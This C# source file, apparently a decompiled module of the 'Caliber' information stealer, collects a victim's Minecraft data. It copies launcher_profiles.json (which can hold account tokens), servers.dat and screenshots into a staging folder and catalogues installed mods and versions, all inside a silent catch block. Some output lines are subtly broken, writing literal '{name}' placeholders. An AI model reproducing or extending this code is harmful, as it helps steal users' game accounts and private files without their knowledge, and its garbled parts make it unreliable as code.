﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal sealed class Minecraft
	{
		private static void SaveVersions(string sSavePath)
		{
			foreach (string path in Directory.GetDirectories(Path.Combine(Minecraft.MinecraftPath, "versions")))
			{
				string name = new DirectoryInfo(path).Name;
				string text = Filemanager.DirectorySize(path) + " bytes";
				string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\versions.txt", "VERSION: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
			}
		}

		private static void SaveMods(string sSavePath)
		{
			foreach (string text in Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "mods")))
			{
				string fileName = Path.GetFileName(text);
				string text2 = new FileInfo(text).Length + " bytes";
				string text3 = File.GetCreationTime(text).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\mods.txt", "MOD: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
			}
		}

		private static void SaveScreenshots(string sSavePath)
		{
			string[] files = Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "screenshots"));
			bool flag = files.Length == 0;
			if (!flag)
			{
				Directory.CreateDirectory(sSavePath + "\\screenshots");
				foreach (string text in files)
				{
					File.Copy(text, sSavePath + "\\screenshots\\" + Path.GetFileName(text));
				}
				Counting.Minecraft++;
			}
		}

		private static void SaveServers(string sSavePath)
		{
			string text = Path.Combine(Minecraft.MinecraftPath, "servers.dat");
			bool flag = !File.Exists(text);
			if (!flag)
			{
				File.Copy(text, sSavePath + "\\servers.dat");
			}
		}

		private static void SaveProfiles(string sSavePath)
		{
			string text = Path.Combine(Minecraft.MinecraftPath, "launcher_profiles.json");
			bool flag = !File.Exists(text);
			if (!flag)
			{
				File.Copy(text, sSavePath + "\\launcher_profiles.json");
			}
		}

		public static void SaveAll(string sSavePath)
		{
			bool flag = !Directory.Exists(Minecraft.MinecraftPath);
			if (!flag)
			{
				try
				{
					Directory.CreateDirectory(sSavePath);
					Minecraft.SaveProfiles(sSavePath);
					Minecraft.SaveServers(sSavePath);
					Minecraft.SaveScreenshots(sSavePath);
					Minecraft.SaveMods(sSavePath);
					Minecraft.SaveVersions(sSavePath);
				}
				catch
				{
				}
			}
		}

		private static string MinecraftPath = Path.Combine(Paths.appdata, ".minecraft");
	}
}
